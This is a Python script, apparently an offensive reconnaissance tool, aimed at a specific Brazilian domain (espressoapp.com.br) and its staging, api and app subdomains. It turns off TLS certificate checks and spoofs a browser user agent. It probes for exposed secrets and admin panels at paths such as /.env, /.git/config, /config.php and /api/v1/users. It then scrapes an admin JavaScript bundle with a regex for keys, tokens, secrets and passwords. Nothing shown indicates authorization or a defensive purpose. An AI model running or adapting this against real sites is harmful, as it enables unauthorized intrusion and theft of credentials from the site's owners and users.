import urllib.request, urllib.error
import ssl
from concurrent.futures import ThreadPoolExecutor, as_completed

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36"

targets = [
    "https://www.espressoapp.com.br/",
    "https://api.espressoapp.com.br/",
    "https://app.espressoapp.com.br/",
    "https://staging.espressoapp.com.br/",
    "https://blog.espressoapp.com.br/",
    "https://espressoapp.com.br/",
]

endpoints = [
    "/.well-known/security.txt",
    "/robots.txt",
    "/sitemap.xml",
    "/api/v1",
    "/.env",
    "/config.php",
    "/wp-admin",
    "/admin",
    "/.git/config",
    "/api/v1/users",
    "/swagger.json",
]

def make_request(url):
    req = urllib.request.Request(url, headers={"User-Agent": ua, "Accept": "*/*"})
    try:
        with urllib.request.urlopen(req, timeout=15, context=ctx) as r:
            body = r.read()
            return r.status, len(body), r.geturl(), r.headers.get("Server"), r.headers.get("X-Powered-By"), body
    except urllib.error.HTTPError as e:
        return e.code, 0, url, None, None, None
    except Exception as e:
        return "ERR", 0, url, None, None, None

print("=== ALVOS PRINCIPAIS ===")
with ThreadPoolExecutor(max_workers=10) as ex:
    futs = [ex.submit(make_request, t) for t in targets]
    for f in as_completed(futs):
        status, size, url, srv, py, body = f.result()
        print(f"{str(status):5s}/{size:5d}  {url}  [srv={srv} py={py}]")

print("\n=== ENDPOINTS COMUNS ===")
base = "https://espressoapp.com.br"
with ThreadPoolExecutor(max_workers=10) as ex:
    futs = [ex.submit(make_request, base+e) for e in endpoints]
    for f in as_completed(futs):
        status, size, url, srv, py, body = f.result()
        print(f"{str(status):5s}/{size:5d}  {url}")

print("\n=== BUSCA POR CHAVES NO JS DO LOGIN ===")
try:
    req = urllib.request.Request("https://www.espressoapp.com.br/assets/admin-066d8eb372849c47b3eeba4e8ef5445f3c719a2722d97d5a5bba593130b5ba40.js", headers={"User-Agent": ua})
    with urllib.request.urlopen(req, timeout=30, context=ctx) as r:
        js = r.read().decode("utf-8", errors="ignore")
    import re
    keys = re.findall(r'[a-zA-Z0-9_]{16,40}(?:key|token|secret|api|password|access)', js, re.IGNORECASE)
    keys = set(keys)
    for k in sorted(keys)[:50]:
        print("  -", k)
except Exception as e:
    print("  [ERRO]", e)